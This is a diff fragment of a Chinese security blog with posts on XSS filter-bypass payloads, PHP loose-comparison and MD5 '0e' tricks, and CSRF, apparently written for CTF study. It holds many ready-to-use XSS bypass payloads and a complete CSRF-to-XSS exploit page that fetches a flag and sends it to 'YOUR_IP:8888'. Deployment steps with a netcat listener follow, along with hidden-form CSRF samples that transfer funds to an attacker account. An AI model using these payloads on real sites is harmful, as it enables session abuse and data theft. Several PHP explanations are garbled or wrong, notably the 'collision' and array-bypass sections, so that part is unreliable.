+<p>大小写绕过<br>​<code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code>​<br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br>​<code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code>​<br>字符拼接(利用eval)<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;</code>​<br>字符拼接(利用top)<br>​<code>&lt;script&gt;top</code>​<a href="%60%60xss%60%60"><code>&quot;al&quot;+&quot;ert&quot;</code></a>​<code>;&lt;/script&gt;</code>​(只有两个&#96;&#96;这里是为了凸显出有&#96;符号)</p>
+</blockquote>
+<h4 id="​​其它字符混淆​​"><a href="#​​其它字符混淆​​" class="headerlink" title="​​其它字符混淆​​"></a>​<strong>​<code>其它字符混淆</code>​</strong>​</h4><blockquote>
+<p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br>可利用注释、标签的优先级等<br>​<code>&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</code>​<br>​<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;</code>​  </p>
+<title><img src="/.com//title">><img src="/.com//x" onerror="alert(xss);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效  
+​`<SCRIPT>var a="\";alert("xss");//";</SCRIPT>`​</title></blockquote>
+<h4 id="​​编码绕过​​"><a href="#​​编码绕过​​" class="headerlink" title="​​编码绕过​​"></a>​<strong>​<code>编码绕过</code>​</strong>​</h4><blockquote>
+<p>​​<strong>​<code>Unicode编码绕过</code>​</strong>​<code> &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</code>​<strong>​<code>url编码绕过</code>​</strong>​&#96;<br><img src="/.com//x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"></p>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`​**​`Ascii码绕过`​**​`
+<img src="/.com//x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">`​**​`Hex绕过`​**​`
+<img src="/.com//x" onerror="eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')">`​**​`八进制绕过`​**​`
+<img src="/.com//x" onerror="alert('\170\163\163')">`​**​`base64绕过`​**​`
+<img src="/.com//x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</iframe></blockquote>
+<h4 id="​​过滤双引号，单引号​​"><a href="#​​过滤双引号，单引号​​" class="headerlink" title="​​过滤双引号，单引号​​"></a>​<strong>​<code>过滤双引号，单引号</code>​</strong>​</h4><blockquote>
+<p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号<br> <code>&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</code>​<br> 使用编码绕过，具体看上面列举的例子</p>
+</blockquote>
+<h4 id="​​过滤括号​​"><a href="#​​过滤括号​​" class="headerlink" title="​​过滤括号​​"></a>​<strong>​<code>过滤括号</code>​</strong>​</h4><blockquote>
+<p>当括号被过滤的时候可以使用throw来绕过<br> <code>&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code>​</p>
+</blockquote>
+<h4 id="​​过滤url地址​​"><a href="#​​过滤url地址​​" class="headerlink" title="​​过滤url地址​​"></a>​<strong>​<code>过滤url地址</code>​</strong>​</h4><blockquote>
+<p>使用url编码<br>&lt;img src&#x3D;”x” onerror&#x3D;document.location&#x3D;<code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/</code>​&gt;<br>使用IP<br>​<code>&lt;img src=&quot;x&quot; onerror=document.location=http://2130706433/&gt;十进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0177.0.0.01/&gt;八进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0x7f.0x0.0x0.0x1/&gt;十六进制 &lt;img src=&quot;x&quot; onerror=document.location=//www.baidu.com&gt;html标签中用//可以代替http:// 使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)</code>​<br>使用中文逗号代替英文逗号<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</code>​</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/" data-id="cmawczpnw001hik7kaxth92bx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/PHP比较漏洞/弱比较" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%B1%E6%AF%94%E8%BE%83/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h1><h3 id="1-MD5-碰撞攻击"><a href="#1-MD5-碰撞攻击" class="headerlink" title="1. MD5 碰撞攻击"></a>1. <strong>MD5 碰撞攻击</strong></h3><ul>
+<li><strong>原理</strong>: MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。</li>
+<li><strong>示例</strong>:</li>
+<li><pre><code class="language-php">$x = &quot;240610708&quot;;
+$y = &quot;QNKCDZO&quot;;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  这两个字符串的 MD5 哈希值都是 `0e830400451993494058024219903391`​，因此 `md5($x) == md5($y)`​ 会返回 `true`​。</span><br><span class="line"></span><br><span class="line">### 2. **科学计数法绕过**</span><br><span class="line"></span><br><span class="line">- **原理**: PHP 在比较字符串时，如果字符串以 `0e`​ 开头，并且后面都是数字，PHP 会将其解释为科学计数法表示的浮点数 `0`​。因此，如果两个字符串的 MD5 哈希值都以 `0e`​ 开头，并且后面都是数字，它们会被认为是相等的。</span><br><span class="line">- **示例**:</span><br><span class="line">- ```php</span><br><span class="line">  $x = &quot;240610708&quot;;</span><br><span class="line">  $y = &quot;QNKCDZO&quot;;</span><br></pre></td></tr></table></figure>
+
+如上所述，这两个字符串的 MD5 哈希值都是 `0e830400451993494058024219903391`​，PHP 会认为它们相等。
+</code></pre>
+</li>
+</ul>
+<h3 id="3-空字符串绕过"><a href="#3-空字符串绕过" class="headerlink" title="3. 空字符串绕过"></a>3. <strong>空字符串绕过</strong></h3><ul>
+<li><strong>原理</strong>: 空字符串的 MD5 哈希值是 <code>d41d8cd98f00b204e9800998ecf8427e</code>​，但如果输入为空字符串，某些情况下可能会被忽略或处理为相同的值。</li>
+<li><strong>示例</strong>:</li>
+<li><pre><code class="language-php">$x = &quot;&quot;;
+$y = &quot;&quot;;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  这种情况下，`md5($x) == md5($y)`​ 显然为 `true`​。</span><br><span class="line"></span><br><span class="line">### 4. **大小写不敏感**</span><br><span class="line"></span><br><span class="line">- **原理**: 如果代码中使用了不区分大小写的比较（如 `strcasecmp`​ 或 `==`​），可能会绕过某些检查。</span><br><span class="line">- **示例**:</span><br><span class="line">- ```php</span><br><span class="line">  $x = &quot;abc&quot;;</span><br><span class="line">  $y = &quot;ABC&quot;;</span><br></pre></td></tr></table></figure>
+
+如果使用 `strcasecmp(md5($x), md5($y)) == 0`​，则可能会绕过检查。
+</code></pre>
+</li>
+</ul>
+<h3 id="5-特殊字符处理"><a href="#5-特殊字符处理" class="headerlink" title="5. 特殊字符处理"></a>5. <strong>特殊字符处理</strong></h3><ul>
+<li><strong>原理</strong>: 某些特殊字符在输入时可能会被处理为相同的值，尤其是在 URL 编码或解码过程中。</li>
+<li><strong>示例</strong>:</li>
+<li><pre><code class="language-php">$x = &quot;%00&quot;;
+$y = &quot;&quot;;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  在某些情况下，`%00`​ 可能会被解释为空字符串，从而导致 `md5($x) == md5($y)`​ 为 `true`​。</span><br><span class="line"></span><br><span class="line">### 6. **时间戳或随机数绕过**</span><br><span class="line"></span><br><span class="line">- **原理**: 如果输入是基于时间戳或随机数生成的，可能在某些情况下生成相同的 MD5 哈希值。</span><br><span class="line">- **示例**:</span><br><span class="line">- ```php</span><br><span class="line">  $x = time();</span><br><span class="line">  $y = time() - 1;</span><br></pre></td></tr></table></figure>
+
+虽然这种情况比较罕见，但在某些特定情况下可能会发生。
+</code></pre>
+</li>
+</ul>
+<h3 id="7-利用-PHP-的松散比较"><a href="#7-利用-PHP-的松散比较" class="headerlink" title="7. 利用 PHP 的松散比较"></a>7. <strong>利用 PHP 的松散比较</strong></h3><ul>
+<li><strong>原理</strong>: PHP 中的 <code>==</code>​ 是松散比较，会进行类型转换。如果两个字符串的 MD5 哈希值在类型转换后相等，<code>==</code>​ 会返回 <code>true</code>​。</li>
+<li><strong>示例</strong>:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="string">&quot;0e123456789abcdef&quot;</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="string">&quot;0e987654321fedcba&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这两个字符串的 MD5 哈希值都以 <code>0e</code>​ 开头，PHP 会认为它们相等。</p>
+<h3 id="8-数组绕过"><a href="#8-数组绕过" class="headerlink" title="8. 数组绕过"></a>8. 数组绕过</h3><ul>
+<li><strong>原理</strong>: PHP 中的 <code>==</code>​ 是松散比较，会进行类型转换。如果两个字符串的 MD5 哈希值在类型转换后相等，<code>==</code>​ 会返回 <code>true</code>​。</li>
+<li><strong>示例</strong>:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x[]=<span class="number">1</span>&amp;y[]=<span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<p>这两个字符串的 MD5 哈希值都以 <code>0e</code>​ 开头，PHP 会认为它们相等。</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%B1%E6%AF%94%E8%BE%83/" data-id="cmawczpnw001jik7kdh0c4maj" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -3052,7 +2625,179 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/" data-id="cmawcq0my001zrk7k3umm7z7k" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/" data-id="cmawczpnx001kik7k9lpbafvy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/CSRF/未命名" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="未命名"><a href="#未命名" class="headerlink" title="未命名"></a>未命名</h1><h4 id="示例恶意页面"><a href="#示例恶意页面" class="headerlink" title="示例恶意页面"></a><strong>示例恶意页面</strong></h4><p>下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF-to-XSS Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Construct the XSS payload. Dynamically split the closing tag to avoid premature termination.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="string">`&lt;scr`</span> + <span class="string">`ipt&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      // Use fetch() to retrieve the homepage which includes the flag (after admin&#x27;s draft is published)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server. Replace YOUR_IP:8888 with your attacker&#x27;s address.</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          var exfilUrl = &quot;http://YOUR_IP:8888/?flag=&quot; + encodeURIComponent(data);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/scr`</span> + <span class="string">`ipt&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL-encode the payload so it can be safely passed as a parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> encodedPayload = <span class="built_in">encodeURIComponent</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Build the target URL using the /ephemeral endpoint which reflects the msg parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> targetUrl = <span class="string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Create an invisible iframe to force admin&#x27;s browser to load the target URL and execute our payload</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>部署步骤：</strong></p>
+<ol>
+<li><p>将上述代码保存为 <code>index.html</code>​，并将 <code>YOUR_IP:8888</code>​ 替换成你攻击机的实际 IP 和监听端口。</p>
+</li>
+<li><p>在你的攻击机上启动一个 HTTP 服务器，例如：</p>
+<p> ​<code>python3 -m http.server 1337</code>​</p>
+<p> 使恶意页面可通过 <code>http://hacker.localhost:1337/</code>​ 访问。</p>
+</li>
+<li><p>启动一个监听服务器（例如使用 netcat）：</p>
+<p> ​<code>nc -l -p 8888 -v</code>​</p>
+</li>
+<li><p>使用 victim 工具触发 admin 访问你的恶意页面：</p>
+<p> ​<code>/challenge/victim http://hacker.localhost:1337/</code>​</p>
+</li>
+<li><p>管理员的浏览器加载页面后，会通过 CSRF 触发反射型 XSS，进而执行 fetch() 请求，获取包含 flag 的页面内容，并通过 Image() 将数据 exfiltrate 到你的监听服务器。</p>
+</li>
+<li><p>检查 netcat 输出，从 exfiltrated 数据中提取出 flag。</p>
+</li>
+</ol>
+<p>‍</p>
+<h3 id="三、CTF-中的-CSRF-实战案例"><a href="#三、CTF-中的-CSRF-实战案例" class="headerlink" title="三、CTF 中的 CSRF 实战案例"></a>三、CTF 中的 CSRF 实战案例</h3><p>在 CTF 竞赛中，题目往往会设计一个脆弱的 Web 应用程序，让参赛者利用 CSRF 发起请求。一个典型的场景如下：</p>
+<ul>
+<li><strong>目标应用（pwnpost）：</strong><br>管理员的 flag 隐藏在草稿帖子中，只有在发布后才会完整显示。管理员默认不会发布草稿。</li>
+<li><strong>攻击思路：</strong><br>利用 CSRF 诱使管理员浏览器发起一个 POST 请求到 <code>/publish</code>​，将草稿帖子发布。由于管理员的页面对草稿做了部分隐藏，所以发布后 flag 会完整显示。</li>
+<li><strong>利用 CSRF-to-XSS 链：</strong><br>由于直接窃取 HttpOnly cookie 不可行，攻击者可以利用 CSRF 触发一个反射型 XSS 漏洞，从而在管理员浏览器中执行 JavaScript。该 JavaScript 使用 fetch() 请求目标页面，获取 flag 内容，再通过其他手段（例如 Image() 对象） exfiltrate 数据到攻击者服务器。</li>
+</ul>
+<p>‍</p>
+<blockquote>
+<p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种针对 Web 应用程序的攻击方式。通过 CSRF，攻击者诱导受害者在不知情的情况下，以受害者的身份执行非本意的操作。本文将详细介绍 CSRF 的基本原理、常见攻击方式、在 CTF 中的实战案例，以及如何防御 CSRF 攻击。</p>
+</blockquote>
+<h3 id="一、CSRF-的基本原理"><a href="#一、CSRF-的基本原理" class="headerlink" title="一、CSRF 的基本原理"></a>一、CSRF 的基本原理</h3><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=CSRF%20%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">CSRF 攻击</a>的核心思想是：<br><strong>如果受害者已经登录某个网站，那么攻击者可以诱使受害者的浏览器在后台自动发送请求，这个请求会自动携带受害者的身份验证信息（如 Cookie），从而导致非本意的操作。</strong></p>
+<h4 id="1-1-浏览器与-Cookie-的关系"><a href="#1-1-浏览器与-Cookie-的关系" class="headerlink" title="1.1 浏览器与 Cookie 的关系"></a>1.1 浏览器与 Cookie 的关系</h4><ul>
+<li><p><strong>Cookie 自动携带：</strong><br>当用户在浏览器中登录某个网站时，服务器会通过 Set-Cookie 将身份验证数据（如 SessionID）存储到浏览器中。以后，浏览器在访问同一网站时会自动带上这些 Cookie，无需用户额外操作。</p>
+</li>
+<li><p><strong>同源策略（SOP）：</strong><br>浏览器通过同源策略来限制脚本访问其它域的数据，但对于跨站表单提交（如 GET 或 POST 请求），浏览器会自动携带 Cookie。CSRF 就正是利用这一特点来伪造请求。</p>
+</li>
+</ul>
+<h4 id="1-2-CSRF-攻击流程"><a href="#1-2-CSRF-攻击流程" class="headerlink" title="1.2 CSRF 攻击流程"></a>1.2 CSRF 攻击流程</h4><ol>
+<li><p><strong>受害者登录：</strong><br> 受害者在目标网站（例如银行、论坛等）登录后，浏览器中保存了有效的 Cookie 和会话信息。</p>
+</li>
+<li><p><strong>攻击者构造恶意页面：</strong><br> 攻击者在自己控制的网站上（例如 hacker.localhost）制作一个恶意页面，该页面中嵌入了指向目标网站的请求。常见的方式包括使用隐藏的 HTML 表单、图片标签或 iframe 等。</p>
+</li>
+<li><p><strong>诱导受害者访问恶意页面：</strong><br> 攻击者通过钓鱼邮件、链接分享或其它方式诱导受害者访问恶意页面。当受害者访问时，浏览器会自动向目标网站发送请求，并携带受害者的 Cookie。</p>
+</li>
+<li><p><strong>目标网站执行操作：</strong><br> 由于请求中包含了合法的 Cookie，目标网站认为这是受害者本人发出的请求，从而执行敏感操作，如转账、修改密码、发布消息等。</p>
+</li>
+</ol>
+<p>‍</p>
+<h3 id="二、CSRF-攻击的常见方式"><a href="#二、CSRF-攻击的常见方式" class="headerlink" title="二、CSRF 攻击的常见方式"></a>二、CSRF 攻击的常见方式</h3><h4 id="2-1-隐藏表单自动提交"><a href="#2-1-隐藏表单自动提交" class="headerlink" title="2.1 隐藏表单自动提交"></a>2.1 隐藏表单自动提交</h4><p>攻击者在恶意页面中构造一个隐藏的 HTML 表单，并使用 JavaScript 自动提交。</p>
+<p>示例代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://targetsite.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 隐藏字段，如果目标接口需要参数 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to_account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrfForm&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这种方式依赖于浏览器自动提交表单，并且不会受到同源策略的限制，因为表单提交会自动携带 Cookie。</p>
+<h4 id="2-2-利用图片或-iframe"><a href="#2-2-利用图片或-iframe" class="headerlink" title="2.2 利用图片或 iframe"></a>2.2 利用图片或 iframe</h4><p>攻击者利用 <code>&lt;img&gt;</code>​ 或 <code>&lt;iframe&gt;</code>​ 标签触发 GET 请求。例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 触发 GET 请求，自动携带 Cookie --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://targetsite.com/delete_account?user=admin&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或使用 iframe：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://targetsite.com/perform_action?param=value&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-JavaScript-触发重定向"><a href="#2-3-JavaScript-触发重定向" class="headerlink" title="2.3 JavaScript 触发重定向"></a>2.3 JavaScript 触发重定向</h4><p>在受害者浏览器中使用 JavaScript 重定向到目标 URL，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;http://targetsite.com/perform_action?param=value&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种方式也会自动携带受害者的 Cookie，从而完成 CSRF 攻击。</p>
+<p>‍</p>
+<h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><p>为了防止 CSRF 攻击，常用的防御措施包括：</p>
+<ul>
